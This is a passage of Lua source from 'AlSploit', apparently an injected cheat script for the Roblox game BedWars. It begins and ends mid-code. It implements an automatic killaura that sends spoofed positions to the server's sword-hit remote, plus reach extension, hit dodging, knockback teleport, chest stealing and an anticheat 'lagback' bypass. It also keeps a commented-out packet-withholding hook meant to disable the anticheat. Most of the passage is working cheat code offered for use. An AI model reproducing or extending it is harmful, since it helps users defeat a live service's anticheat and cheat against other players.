	local function SwordHit(Entity, Damage, Armor, Weapon, NearestEntityDistance)				
		task.spawn(function()
			if AlSploitSettings.Killaura.CustomAnimation.Value == true and KillAuraAnimationCooldown == false then
				KillAuraAnimationCooldown = true

				PlayAnimation(KillauraAnimations[SelectedAnimation])

				KillAuraAnimationCooldown = false
			end
		end)

		task.spawn(function()
			if (not Weapon or not Entity or IsAlive(LocalPlayer) == false or AlSploitSettings.Killaura.ParticleEffect.Value == false) and ParticleEffect then
				pcall(function()
					ParticleEffect:Destroy()
					ParticleEffect = nil
				end)
			end

			if (not Weapon or not Entity or IsAlive(LocalPlayer) == false or AlSploitSettings.Killaura.ParticleEffect.Value == false) and KillauraBox then
				pcall(function()
					KillauraBox:Destroy()
					KillauraBox = nil
				end)
			end

			if AlSploitSettings.Killaura.ParticleEffect.Value == true and not ParticleEffect and Entity then			
				ParticleEffect = Instance.new("Part")

				ParticleEffect.Parent = WorkSpace
				ParticleEffect.Name = "ParticleEffect"

				ParticleEffect.Transparency = 1
				ParticleEffect.CanCollide = false
				ParticleEffect.Anchored = true
				ParticleEffect.Size = Vector3.new(3.63, 4.27, 0.001)

				local ParticleEmitter = Instance.new("ParticleEmitter")

				ParticleEmitter.Parent = ParticleEffect
				ParticleEmitter.Name = "ParticleEmitter"

				ParticleEmitter.EmissionDirection = Enum.NormalId.Front
				ParticleEmitter.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(0.5,0.125,0),NumberSequenceKeypoint.new(1,0.5499999523162842,0)})
				ParticleEmitter.Brightness = 1
				ParticleEmitter.Lifetime = NumberRange.new(0.75, 1.75)
				ParticleEmitter.Texture = "rbxassetid://98715730126785"
				ParticleEmitter.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.new(113/255,4/85,1)),ColorSequenceKeypoint.new(1,Color3.new(113/255,4/85,1))})
				ParticleEmitter.Speed = NumberRange.new(3)
				ParticleEmitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0,0.6,0),NumberSequenceKeypoint.new(1,0,0)})
				ParticleEmitter.Rate = 23
			end

			if AlSploitSettings.Killaura.ShowEnemy.Value == true and not KillauraBox and Entity then			
				KillauraBox = Instance.new("Part")

				KillauraBox.Parent = WorkSpace
				KillauraBox.Name = "KillauraBox"

				KillauraBox.Transparency = 0.6
				KillauraBox.CanCollide = false
				KillauraBox.CanQuery = false
				KillauraBox.Anchored = true
				KillauraBox.Material = Enum.Material.SmoothPlastic
				KillauraBox.CFrame = Entity.PrimaryPart.CFrame

				local ColorSplit = string.split(AlSploitSettings.Killaura.TargetBoxColor.Value, ",")

				local R = ColorSplit[1]
				local G = ColorSplit[2]
				local B = ColorSplit[3]

				KillauraBox.Color = Color3.new(R, G, B)
				KillauraBox.Size = Vector3.new(4, 6, 4)
			end

			if ParticleEffect then											
				ParticleEffect.CFrame = (Entity.PrimaryPart.CFrame - (Entity.PrimaryPart.CFrame.LookVector * 1.2))
			end

			if KillauraBox then											
				KillauraBox.CFrame = Entity.PrimaryPart.CFrame

				local ColorSplit = string.split(AlSploitSettings.Killaura.TargetBoxColor.Value, ",")

				local R = ColorSplit[1]
				local G = ColorSplit[2]
				local B = ColorSplit[3]

				KillauraBox.Color = Color3.new(R, G, B)
			end	
		end)

		local LookVector = LocalPlayer.Character.PrimaryPart.CFrame.LookVector
		local Unit = (Entity.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Unit

		local Angle = math.acos(Unit:Dot(LookVector))

		if Angle > math.rad((AlSploitSettings.Killaura.Angle.Value / 2)) then
			return
		end

		local RaycastParameters = RaycastParams.new()

		RaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
		RaycastParameters.FilterType = Enum.RaycastFilterType.Include

		local Raycast = WorkSpace:Raycast(LocalPlayer.Character.PrimaryPart.Position, Entity.PrimaryPart.Position, RaycastParameters)

		if AlSploitSettings.Killaura.WallCheck.Value == true and (Raycast and Raycast.Position or true) then
			return
		end	

		if AlSploitSettings.Killaura.Exeptions.MouseDown.Value == true and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) == false then
			return
		end

		if AlSploitSettings.Killaura.Exeptions.GuiClosed.Value == true and ContainerFrame.Visible == true then
			return
		end

		task.spawn(function()
			if AlSploitSettings.Killaura.SwitchToWeapon.Value == true and Weapon then
				SwitchItem(Weapon.itemType)
			end
		end)

		local LocalPlayerHumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
		local EntityPrimaryPart = Entity.PrimaryPart

		local Magnitude = (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude

		local MouseRay = Ray.new(Camera.CFrame.Position, Entity.PrimaryPart.Position).Unit.Direction

		local LookVector = CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).LookVector
		local SelfPosition = ((math.max(Magnitude - 14.39999, 0) * LookVector) + LocalPlayer.Character.PrimaryPart.Position) --Thanks to @Waswigsman for the new ka prediction :D

		--local ChargeRatio = GetChargeRatio(Damage, Entity.Humanoid.Health, Armor)

		task.spawn(function()
			BedwarsControllers.SwordController.lastAttack = WorkSpace:GetServerTimeNow()

			if Weapon then
				BedwarsRemotes.SwordHitRemote:FireServer({
					weapon = Weapon.tool,
					chargedAttack = {chargeRatio = 0},
					entityInstance = Entity,
					validate = {
						targetPosition = ({value = EntityPrimaryPart.Position}),
						selfPosition = ({value = SelfPosition})
					}
				})
			end
		end)

		task.spawn(function()
			if EquippedKit == "summoner" then						
				BedwarsRemotes.SummonerClawAttackRequestRemote:FireServer({clientTime = tick(), direction = LocalPlayer.Character.PrimaryPart.CFrame.LookVector, position = LocalPlayer.Character.PrimaryPart.Position})
			end
		end)
	end

	local Killaura = CombatTab:CreateToggle({
		Name = "Killaura",

		Function = function() end,

		HoverText = "Automatically Hits Entities For You 🎯"
	})

	local CustomAnimation = Killaura:CreateToggle({
		Name = "CustomAnimation",

		Function = function() end,

		DefaultValue = true
	})

	local ParticleEffect = Killaura:CreateToggle({
		Name = "ParticleEffect",

		Function = function() end,

		DefaultValue = true
	})

	local SwitchToWeapon = Killaura:CreateToggle({
		Name = "SwitchToWeapon",

		Function = function() end,

		DefaultValue = true
	})

	local ShowEnemy = Killaura:CreateToggle({
		Name = "ShowEnemy",

		Function = function() end,

		DefaultValue = true
	})

	local WallCheck = Killaura:CreateToggle({
		Name = "WallCheck",

		Function = function() end,

		DefaultValue = false
	})

	local HitChance = Killaura:CreateSlider({
		Name = "HitChance",

		Function = function() end,	

		DefaultValue = 100,
		MaximumValue = 100
	})

	local Speed = Killaura:CreateSlider({
		Name = "Speed",

		Function = function() end,	

		DefaultValue = 100,
		MaximumValue = 100
	})

	local Range = Killaura:CreateSlider({
		Name = "Range",

		Function = function() end,	

		DefaultValue = 19,
		MaximumValue = 19
	})

	local Angle = Killaura:CreateSlider({
		Name = "Angle",

		Function = function() end,	

		DefaultValue = 360,
		MaximumValue = 360
	})	

	local Exeptions = Killaura:CreateDropdown({
		Name = "Exeptions",
		HoverText = "What Is Required For Killaura To Work"
	})

	local MouseDown = Exeptions:CreateToggle({
		Name = "MouseDown",

		Function = function() end,

		DefaultValue = false
	})

	local GuiClosed = Exeptions:CreateToggle({
		Name = "GuiClosed",

		Function = function() end,

		DefaultValue = false
	})

	local Animations = Killaura:CreateDropdown({
		Name = "Animations",
		HoverText = "Pick The Animation Of Your Choice"
	})

	local AlSploitClassic = Animations:CreateToggle({
		Name = "AlSploitHeartbeat",

		Function = function()
			if AlSploitSettings.Killaura.Animations.AlSploitHeartbeat.Value == true then
				SelectedAnimation = "AlSploitHeartbeat"
			end
		end,

		DefaultValue = false
	})

	local AlSploitClassic = Animations:CreateToggle({
		Name = "AlSploitClassic",

		Function = function()
			if AlSploitSettings.Killaura.Animations.AlSploitClassic.Value == true then
				SelectedAnimation = "AlSploitClassic"
			end
		end,

		DefaultValue = true
	})

	local AlSploitClassic = Animations:CreateToggle({
		Name = "AlSploitOld",

		Function = function()
			if AlSploitSettings.Killaura.Animations.AlSploitOld.Value == true then
				SelectedAnimation = "AlSploitOld"
			end
		end,

		DefaultValue = false
	})

	local TargetBoxColor = Killaura:CreateColorSlider({
		Name = "TargetBoxColor",

		Function = function() end,

		DefaultValue = Color3.new(1, 0.278431, 0.290196)
	})

	AlSploitConnections["KillauraConnection"] = RunService.Heartbeat:Connect(function()
		local HitChance = (AlSploitSettings.Killaura.HitChance.Value == 100 and 1 or math.random(1, (100 / AlSploitSettings.Killaura.HitChance.Value)))

		if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 and HitChance == 1 and AlSploitSettings.Killaura.Value == true then
			local NearestEntity, NearestEntityDistance = FindNearestEntity(AlSploitSettings.Killaura.Range.Value)
			local HighestDamage, Sword = GetSword()

			task.spawn(function()
				if Sword and Sword.tool and not NearestEntity or AlSploitSettings.Killaura.Value == false then
					PlayAnimation(KillauraAnimations.Neutral)
				end
			end)

			task.spawn(function()
				if NearestEntity and AlSploitSettings.Killaura.Value == true then
					local Armor = nil

					pcall(function()
						Armor = GetArmor(PlayerService[NearestEntity.Name])

						if Armor then
							Armor = ArmorReductions[Armor]
						end
					end)

					SwordHit(NearestEntity, HighestDamage, Armor, Sword, NearestEntityDistance)
				end

				if not Sword or not NearestEntity or IsAlive(LocalPlayer) == false or AlSploitSettings.Killaura.ParticleEffect.Value == false then
					pcall(function()
						ParticleEffect:Destroy()
						ParticleEffect = nil
					end)
				end

				if not Sword or not NearestEntity or IsAlive(LocalPlayer) == false or AlSploitSettings.Killaura.ParticleEffect.Value == false then
					pcall(function()
						KillauraBox:Destroy()
						KillauraBox = nil
					end)
				end
			end)						
		end
	end)

	UnInjectEvent.Event:Connect(function()
		if ParticleEffect then
			ParticleEffect:Destroy()
		end

		if KillauraBox then
			KillauraBox:Destroy()
		end		
	end)
end)

task.spawn(function()
	local AntiHit = CombatTab:CreateToggle({
		Name = "AntiHit",

		Function = function()   		
			repeat
				task.wait()

				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 and AlSploitSettings.AntiHit.Value == true and AlSploitSettings.InfiniteFly.Value == false then
					local NearestPlayer = FindNearestPlayer(AlSploitSettings.AntiHit.Range.Value)
					local NearestEntity = FindNearestEntity(AlSploitSettings.AntiHit.Range.Value)

					if NearestPlayer then
						local Clone = CreateClone(true)

						LocalPlayer.Character.PrimaryPart.CFrame = (LocalPlayer.Character.PrimaryPart.CFrame + Vector3.new(0, 10000, 0))

						task.spawn(function()
							repeat
								task.wait()

								if IsAlive(LocalPlayer) == true and Clone then
									Clone.PrimaryPart.Position = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, Clone.PrimaryPart.Position.Y, LocalPlayer.Character.PrimaryPart.Position.Z)
								end
							until AlSploitSettings.AlSploitUnInjected == true or AlSploitSettings.AntiHit.Value == false or AlSploitSettings.InfiniteFly.Value == true
						end)			

						task.wait(1 / math.random(AlSploitSettings.AntiHit.Speed.Value / 1.3, AlSploitSettings.AntiHit.Speed.Value))

						if IsAlive(LocalPlayer) == true then
							LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, -1, LocalPlayer.Character.PrimaryPart.Velocity.Z)
							LocalPlayer.Character.PrimaryPart.CFrame = Clone.PrimaryPart.CFrame

							Camera.CameraSubject = LocalPlayer.Character
							Clone:Destroy()
						end

						task.wait(0.1)
					end

					if NearestEntity and not NearestPlayer and AlSploitSettings.AntiHitEntities == true then
						local Clone = CreateClone()

						LocalPlayer.Character.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame + Vector3.new(0, 50, 0)

						task.spawn(function()
							repeat
								task.wait()

								if IsAlive(LocalPlayer) == true and Clone then
									Clone.PrimaryPart.Position = Vector3.new(LocalPlayer.Character.PrimaryPart.Position.X, Clone.PrimaryPart.Position.Y, LocalPlayer.Character.PrimaryPart.Position.Z)
								end
							until AlSploitSettings.AlSploitUnInjected == true or AlSploitSettings.AntiHit.Value == false or AlSploitSettings.InfiniteFly.Value == true
						end)			

						task.wait(1 / AlSploitSettings.AntiHit.Speed.Value)

						if IsAlive(LocalPlayer) == true then
							LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, -1, LocalPlayer.Character.PrimaryPart.Velocity.Z)
							LocalPlayer.Character.PrimaryPart.CFrame = Clone.PrimaryPart.CFrame

							Camera.CameraSubject = LocalPlayer.Character
							Clone:Destroy()
						end

						task.wait(0.3)
					end	
				end
			until shared.AlSploitUnInjected == true or AlSploitSettings.AntiHit.Value == false
		end,

		HoverText = "Makes You Dodge The Attacks 🏃‍ (Works Better With NoFallDamage)"
	})

	AntiHit:CreateToggle({
		Name = "AntiHitEntities",

		Function = function() end,

		DefaultValue = false
	})

	AntiHit:CreateSlider({
		Name = "Speed",

		Function = function() end,

		MaximumValue = 10,
		DefaultValue = 10
	})

	AntiHit:CreateSlider({
		Name = "Range",

		Function = function() end,

		MaximumValue = 19,
		DefaultValue = 19
	})
end)

task.spawn(function()
	local OldSwingSwordAtMouse
	local OldReach = BedwarsConstants.CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE    

	local Reach = CombatTab:CreateToggle({
		Name = "Reach",

		Function = function()    
			task.spawn(function()
				repeat
					task.wait()

					if IsAlive(LocalPlayer) == true then
						local NearestEntity, NearestEntityDistance = FindNearestEntity(AlSploitSettings.Killaura.Range.Value)

						if NearestEntity then
							BedwarsConstants.CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = (NearestEntityDistance + 2)
						end
					end        
				until shared.AlSploitUnInjected == true or AlSploitSettings.Reach.Value == false

				BedwarsConstants.CombatConstant.RAYCAST_SWORD_CHARACTER_DISTANCE = OldReach
			end)

			task.spawn(function()
				if AlSploitSettings.Reach.Value == true then
					OldSwingSwordAtMouse = BedwarsControllers.SwordController.swingSwordAtMouse

					BedwarsControllers.SwordController.swingSwordAtMouse = function(Enabled, LastSwing, BufferedMobileAttack, ...)    
						BufferedMobileAttack = true

						return OldSwingSwordAtMouse(Enabled, LastSwing, BufferedMobileAttack, ...)          
					end    
				end    

				if AlSploitSettings.Reach.Value == false then
					BedwarsControllers.SwordController.swingSwordAtMouse = OldSwingSwordAtMouse
				end        
			end)
		end,

		HoverText = "Increases Reach 👾"
	})

	UnInjectEvent.Event:Connect(function()
		BedwarsControllers.SwordController.swingSwordAtMouse = OldSwingSwordAtMouse
	end)
end)

task.spawn(function()
	local JadeHammerExploit = BlatantTab:CreateToggle({
		Name = "JadeHammerExploit",

		Function = function()
			repeat
				task.wait(1 / AlSploitSettings.JadeHammerExploit.SpamSpeed.Value)

				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then				
					if HasItem("jade_hammer") and (tick() - JadeHammerTick) > 4 then
						JadeHammerTick = tick()

						BedwarsControllers.AbilityController:useAbility("jade_hammer_jump")
					end	
				end
			until AlSploitSettings.JadeHammerExploit.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Auto Uses The Hammer To Reach High Speeds 🏎️"
	})

	JadeHammerExploit:CreateSlider({
		Name = "SpamSpeed",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 100
	})
end)

task.spawn(function()
	local MelodyHealExploit = BlatantTab:CreateToggle({
		Name = "MelodyHealExploit",

		Function = function()
			repeat
				task.wait(1 / AlSploitSettings.MelodyHealExploit.Speed.Value)

				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then
					local MelodyGuitar = HasItem("guitar")

					if MelodyGuitar then
						BedwarsRemotes.PlayGuitarRemote:FireServer({healTarget = LocalPlayer})
					end
				end
			until AlSploitSettings.MelodyHealExploit.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Heals You With The Guitar 🎸 (Guitar Required)"
	})

	MelodyHealExploit:CreateSlider({
		Name = "Speed",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 100
	})
end)

task.spawn(function()
	local OldBlockPlaceCPS = BedwarsConstants.CPSConstants.BLOCK_PLACE_CPS

	local NoPlacementCPS = BlatantTab:CreateToggle({
		Name = "NoPlacementCPS",

		Function = function()
			if AlSploitSettings.NoPlacementCPS.Value == true then
				BedwarsConstants.CPSConstants.BLOCK_PLACE_CPS = math.huge
			end

			if AlSploitSettings.NoPlacementCPS.Value == false then
				BedwarsConstants.CPSConstants.BLOCK_PLACE_CPS = OldBlockPlaceCPS
			end
		end,

		HoverText = "Removes The Block Placement Cps ⛏️"
	})

	UnInjectEvent.Event:Connect(function()
		BedwarsConstants.CPSConstants.BLOCK_PLACE_CPS = OldBlockPlaceCPS
	end)
end)

task.spawn(function()
	--[[local DirectionSwitchTick = tick()

	local StoredPacketIds = {}
	local PacketCount = 0
	
	local SpeedPerPacketPerSecond = 0.85
	
	local ActKnockbackHook

	local function DisableAnticheat()
		CreateNotification(3, "Disabling Anticheat")

		for i = 1, #StoredPacketIds do
			if AlSploitSettings.PacketDisabler.Value == true and IsAlive(LocalPlayer) == true then
				BedwarsRemotes.ActKnockbackRemote:FireServer({knockbackId = StoredPacketIds[1], playerPosition = LocalPlayer.Character.PrimaryPart.Position})

				table.remove(StoredPacketIds, 1)
				PacketCount = PacketCount - 1	
				
				CreateNotification(1, "Packets Left " .. PacketCount)
				
				task.spawn(function()
					local MoveDirection = LocalPlayer.Character.Humanoid.MoveDirection

					task.wait(0.1)

					local NewMoveDirection = LocalPlayer.Character.Humanoid.MoveDirection

					if (MoveDirection - NewMoveDirection).Magnitude >= 1 then
						DirectionSwitchTick = tick()
					end
				end)
				
				local MoveDirection = LocalPlayer.Character.Humanoid.MoveDirection
				local Vector = LocalPlayer.Character.PrimaryPart.CFrame.lookVector

				if (MoveDirection - Vector).Magnitude > 1.9 then
					Vector = MoveDirection
				end

				if (tick() - DirectionSwitchTick) < 0.7 then
					PacketDisablerSpeed = math.random(1, 3)
				end

				if (tick() - DirectionSwitchTick) > 1 then
					PacketDisablerSpeed = math.random(20, 24)
				end
				
				task.wait(SpeedPerPacketPerSecond)
			end

			if AlSploitSettings.PacketDisabler.Value == false or IsAlive(LocalPlayer) == false then
				PacketDisablerSpeed = 0
				
				break
			end
		end

		CreateNotification(3, "Successfully Disabled Anticheat")

		PacketDisablerSpeed = 0
	end

	task.spawn(function()
		if HookMetaMethod then
			ActKnockbackHook = HookMetaMethod(game, "__namecall", function(self, ...)
				local Arguments = {...}
				local Method = getnamecallmethod():lower()

				if not checkcaller() and Method == "fireserver" and self == BedwarsRemotes.ActKnockbackRemote and Arguments[1]["knockbackId"] then
					if shared.AlSploitUnInjected == false and AlSploitSettings.PacketDisabler.Value == true then
						table.insert(StoredPacketIds, Arguments[1]["knockbackId"])

						PacketCount = PacketCount + 1

						CreateNotification(3, "Added 1 Packet, Total Packets " .. PacketCount)

						return
					end

					return ActKnockbackHook(self, ...)
				end

				return ActKnockbackHook(self, ...)
			end)
		end
		
		if not HookMetaMethod then
			CreateNotification(5, "Your Executor Does Not Support PacketDisabler")
		end
	end)--]]

	local PacketDisabler = BlatantTab:CreateToggle({
		Name = "PacketDisabler",

		Function = function()
			--[[task.spawn(function()
				if AlSploitSettings.PacketDisabler.Value == true and PacketCount <= 1 then
					CreateNotification(3, "Not Enough Packets To Use PacketDisabler")
				end
			end)
			
			if AlSploitSettings.PacketDisabler.Value == true and PacketCount > 1 then
				DisableAnticheat()
			end--]]
		end,

		HoverText = "Disables The Anticheat But Overrides Certain Functions (Keybind Recommended) 🛣️ **Patched**"
	})
end)

task.spawn(function()
	local NoFallDamage = BlatantTab:CreateToggle({
		Name = "NoFallDamage",
		Function = function()
			repeat
				task.wait(0)

				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					if LocalPlayer.Character.PrimaryPart.Velocity.Y < -80 then
						LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
					end
				end
			until shared.AlSploitUnInjected or not AlSploitSettings.NoFallDamage.Value
		end,
		HoverText = "Prevents You From Taking Fall Damage 💪"
	})
end)

task.spawn(function()
	local DamageBoost = BlatantTab:CreateToggle({
		Name = "DamageBoost",

		Function = function() end,

		HoverText = "Boosts Your Speed While Being Damaged 🎢"
	})

	Client:WaitFor("EntityDamageEvent"):andThen(function(v)
		AlSploitConnections["DamageBoostConnection"] = v:Connect(function(DamageTable)
			if IsAlive(LocalPlayer) == true and DamageTable.entityInstance == LocalPlayer.Character and GetMatchState() ~= 0 and AlSploitSettings.DamageBoost.Value == true and shared.AlSploitUnInjected == false then 				
				DamageBoostValue = true

				task.wait(0.6)

				DamageBoostValue = false
			end 
		end)	
	end) 
end)

task.spawn(function()
	local KnockbackTp = BlatantTab:CreateToggle({
		Name = "KnockbackTp",

		Function = function() end,

		HoverText = "Teleports You When Knockback Is Applied 🛸"
	})

	local MovementMethod = KnockbackTp:CreateDropdown({
		Name = "MovementMethod",
		HoverText = "Decide If You Control The Movement Or The Script"
	})

	MovementMethod:CreateToggle({
		Name = "Automatic",

		Function = function() end,

		DefaultValue = false
	})

	MovementMethod:CreateToggle({
		Name = "Manual",

		Function = function() end,

		DefaultValue = true
	})

	local TeleportTo = KnockbackTp:CreateDropdown({
		Name = "TeleportTo",
		HoverText = "Decide Where You Want To Teleport After The Knockback Is Applied"
	})

	TeleportTo:CreateToggle({
		Name = "LookDirection",

		Function = function() end,

		DefaultValue = true
	})

	TeleportTo:CreateToggle({
		Name = "NearestPlayer",

		Function = function() end,

		DefaultValue = false
	})

	TeleportTo:CreateToggle({
		Name = "NearestBed",

		Function = function() end,

		DefaultValue = false
	})

	Client:WaitFor("EntityDamageEvent"):andThen(function(v)
		AlSploitConnections["KnockbackTpConnection"] = v:Connect(function(DamageTable)			
			if IsAlive(LocalPlayer) == true and DamageTable.entityInstance == LocalPlayer.Character and GetMatchState() ~= 0 and AlSploitSettings.KnockbackTp.Value == true and shared.AlSploitUnInjected == false and AnticheatBypassing == false then 
				local KnockbackMultiplier = DamageTable.knockbackMultiplier

				if KnockbackMultiplier and DamageTable.knockbackMultiplier.horizontal then
					KnockbackMultiplier = (DamageTable.knockbackMultiplier.horizontal / 1.5)

					if KnockbackMultiplier then
						local ProgressHud = CreateProgressHud(KnockbackMultiplier)
						local Speed = (GetSpeed() * (DamageBoostValue == true and 2.5 or 20))

						if AlSploitSettings.KnockbackTp.TeleportTo.LookDirection.Value == true then
							if AlSploitSettings.KnockbackTp.MovementMethod.Automatic.Value == true then
								local StartTick = tick()

								local Unit = Vector3.new(LocalPlayer.Character.PrimaryPart.CFrame.LookVector.X, 0, LocalPlayer.Character.PrimaryPart.CFrame.LookVector.Z).Unit

								task.spawn(function()
									repeat
										task.wait()

										Speed = (GetSpeed() * (DamageBoostValue == true and 2.5 or 15))

										LocalPlayer.Character.PrimaryPart.Velocity = (Unit * Speed)
									until shared.AlSploitUnInjected == true or AlSploitSettings.KnockbackTp.Value == false or IsAlive(LocalPlayer) == false or ((tick() - StartTick) >= KnockbackMultiplier)

									LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
								end)

								return
							end

							if AlSploitSettings.KnockbackTp.MovementMethod.Manual.Value == true then
								local StartTick = tick()

								task.spawn(function()
									repeat
										task.wait()

										Speed = (GetSpeed() * (DamageBoostValue == true and 2.5 or 15))

										local Unit = Vector3.new(LocalPlayer.Character.PrimaryPart.CFrame.LookVector.X, 0, LocalPlayer.Character.PrimaryPart.CFrame.LookVector.Z).Unit

										LocalPlayer.Character.PrimaryPart.Velocity = (Unit * Speed)
									until shared.AlSploitUnInjected == true or AlSploitSettings.KnockbackTp.Value == false or IsAlive(LocalPlayer) == false or ((tick() - StartTick) >= KnockbackMultiplier)

									LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
								end)

								return
							end
						end

						if AlSploitSettings.KnockbackTp.TeleportTo.NearestPlayer.Value == true then
							local NearestPlayer = FindNearestPlayer()

							if NearestPlayer then
								local StartTick = tick()

								local Unit = (NearestPlayer.Character.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Unit

								task.spawn(function()
									repeat
										task.wait()

										Speed = (GetSpeed() * (DamageBoostValue == true and 2.5 or 15))

										LocalPlayer.Character.PrimaryPart.Velocity = (Unit * Speed)
									until shared.AlSploitUnInjected == true or AlSploitSettings.KnockbackTp.Value == false or IsAlive(LocalPlayer) == false or ((tick() - StartTick) >= KnockbackMultiplier)

									LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
								end)

								return
							end
						end

						if AlSploitSettings.KnockbackTp.TeleportTo.NearestBed.Value == true then
							local NearestBed = FindNearestBed(false)

							if NearestBed then
								local StartTick = tick()

								local Unit = (NearestBed.Position - LocalPlayer.Character.PrimaryPart.Position).Unit

								task.spawn(function()
									repeat
										task.wait()

										Speed = (GetSpeed() * (DamageBoostValue == true and 2.5 or 15))

										LocalPlayer.Character.PrimaryPart.Velocity = (Unit * Speed)
									until shared.AlSploitUnInjected == true or AlSploitSettings.KnockbackTp.Value == false or IsAlive(LocalPlayer) == false or ((tick() - StartTick) >= KnockbackMultiplier)

									LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
								end)

								return
							end
						end
					end
				end
			end 
		end)	
	end) 
end)

task.spawn(function()
	local InfiniteJump = BlatantTab:CreateToggle({
		Name = "InfiniteJump",

		Function = function()
			if AlSploitSettings.InfiniteJump.Value == true then
				AlSploitConnections["InfiniteJumpConnection"] = UserInputService.JumpRequest:Connect(function()
					if shared.AlSploitUnInjected == false and IsAlive(LocalPlayer) == true and AlSploitSettings.InfiniteFly.Value == false and AlSploitSettings.Fly.Value == false then
						LocalPlayer.Character.Humanoid:ChangeState("Jumping")
					end
				end)
			end

			if AlSploitSettings.InfiniteJump.Value == false and AlSploitConnections["InfiniteJumpConnection"] then
				AlSploitConnections["InfiniteJumpConnection"]:Disconnect()
			end
		end,

		HoverText = "Allows You To Jump Without A Cooldown 🦘"
	})
end)

task.spawn(function()
	local ChestStealer = BlatantTab:CreateToggle({
		Name = "ChestStealer",

		Function = function()
			repeat
				task.wait(0.1)

				if IsAlive(LocalPlayer) == true then
					local NearestChest = FindNearestChest(AlSploitSettings.ChestStealer.Range.Value)

					if NearestChest then					
						local Chestitems = NearestChest:FindFirstChild("ChestFolderValue").Value:GetChildren()

						BedwarsRemotes.SetObservedChestRemote:FireServer("BlockChest")

						for i2, v2 in next, Chestitems do
							if v2:IsA("Accessory") then
								BedwarsRemotes.ChestGetItemRemote:InvokeServer(NearestChest:FindFirstChild("ChestFolderValue").Value, v2)
							end
						end

						BedwarsRemotes.SetObservedChestRemote:FireServer(nil)
					end
				end		
			until shared.AlSploitUnInjected == true or AlSploitSettings.ChestStealer.Value == false
		end,

		HoverText = "Steals Items From Chests 💀"
	})

	ChestStealer:CreateSlider({
		Name = "Range",

		Function = function() end,

		MaximumValue = 30,
		DefaultValue = 30
	})
end)

task.spawn(function()
	local OldMoveFunction = BedwarsModules.ControlModule.moveFunction

	local Clone

	local function AttemptAnticheatBypass()
		AnticheatBypassing = true
		Clone = CreateClone(false)

		BedwarsModules.ControlModule.moveFunction = function(Self, Vec, ...)
			local RaycastParameters = RaycastParams.new()

			RaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
			RaycastParameters.FilterType = Enum.RaycastFilterType.Include

			local LookVector = Vector3.new(Camera.CFrame.LookVector.X, 0, Camera.CFrame.LookVector.Z).Unit

			if Clone.PrimaryPart then
				local Raycast = WorkSpace:Raycast((Clone.PrimaryPart.Position + LookVector), Vector3.new(0, -1000, 0), RaycastParameters)
				local Raycast2 = WorkSpace:Raycast(((Clone.PrimaryPart.Position - Vector3.new(0, 15, 0)) + (LookVector * 5)), Vector3.new(0, -1000, 0), RaycastParameters)

				if Raycast or Raycast2 then
					Clone.PrimaryPart.CFrame = CFrame.new(Clone.PrimaryPart.Position + (LookVector / (16 / GetSpeed())))

					Vec = LookVector
				end

				if not Clone then
					if IsAlive(LocalPlayer) then
						BedwarsModules.ControlModule.moveFunction = OldMoveFunction

						Camera.CameraSubject = LocalPlayer.Character.Humanoid
					end
				end
			end

			return OldMoveFunction(Self, Vec, ...)
		end
	end

	local AntiLagback = BlatantTab:CreateToggle({
		Name = "AntiLagback",

		Function = function()
			if AlSploitSettings.AntiLagback.Value == true then
				AlSploitConnections["AntiLagbackConnection"] = LocalPlayer:GetAttributeChangedSignal("LastTeleported"):Connect(function()
					if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 and not LocalPlayer.Character:FindFirstChildWhichIsA("ForceField") then					
						CreateNotification(2, "Lagback Detected, Attempting Bypass")

						AttemptAnticheatBypass()		

						task.wait(4.5)

						if IsAlive(LocalPlayer) == false then
							BedwarsModules.ControlModule.moveFunction = OldMoveFunction

							Clone:Destroy()

							AnticheatBypassing = false
						end

						if IsAlive(LocalPlayer) == true then
							BedwarsModules.ControlModule.moveFunction = OldMoveFunction

							Camera.CameraSubject = LocalPlayer.Character.Humanoid
							Clone:Destroy()

							AnticheatBypassing = false

							CreateNotification(2, "Successfully Bypassed Lagback")
						end
					end 
				end)
			end

			if AlSploitSettings.AntiLagback.Value == false then
				if AlSploitConnections["AntiLagbackConnection"] then
					AlSploitConnections["AntiLagbackConnection"]:Disconnect()
				end

				BedwarsModules.ControlModule.moveFunction = OldMoveFunction
			end
		end,

		HoverText = "Bypasses Lagbacks (Anticheat) 🔐"
	})

	local MovementMethod = AntiLagback:CreateDropdown({
		Name = "MovementMethod",
		HoverText = "Decide If You Control The Movement Or The Script"
	})

	MovementMethod:CreateToggle({
		Name = "Automatic",

		Function = function() end,

		DefaultValue = false
	})

	MovementMethod:CreateToggle({
		Name = "Manual",

